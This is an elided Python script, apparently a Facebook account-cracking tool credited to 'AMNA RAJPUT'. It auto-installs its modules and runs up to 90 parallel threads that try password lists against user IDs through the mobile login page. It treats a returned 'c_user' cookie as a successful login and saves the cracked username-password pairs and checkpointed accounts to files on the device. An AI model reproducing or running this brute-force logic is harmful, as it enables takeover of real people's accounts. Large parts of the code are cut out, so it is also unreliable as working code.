import os,sys
try: import requests
except ModuleNotFoundError:print("Aking Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("Aking Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("Aking Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
...
def main_apv():
    ...
    try:
        ...
        print ("[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡")
        time.sleep(3.5)
        os.system("xdg-open https://wa.me/+923150470458")
...
def R():
			...
			print(" [*] Expired : \033[1;92m30 Days\033[1;97m")
			print (' [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡')
...
ua_TECNO = 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; TECNO CF8 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36;]'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [AMNA] %s/%s  \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[SUCCESSFUL-AMNA] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/AMNA_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/AMNA_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[CHECKPOINT-AMNA] %s | %s%s      ' % (user,pw,tahun(user)))
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=90) as (_ngentot_gratis_):
...
|  
\033[1;34m.   | | | || |  | || |\  || | | |
\033[1;34m    \_| |_/\_|  |_/\_| \_/\_| |_/
\033[1;37m [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
    Author   : AMNA RAJPUT
    Facebook : ERROR
    Connect  : +923150470458
    Version  : 1.0
 [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
 \033[1;32m    LIFE IS LUCK MAKE IT 381A \033[1;37m
 [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡"""
ct = datetime.now()
n = ct.month
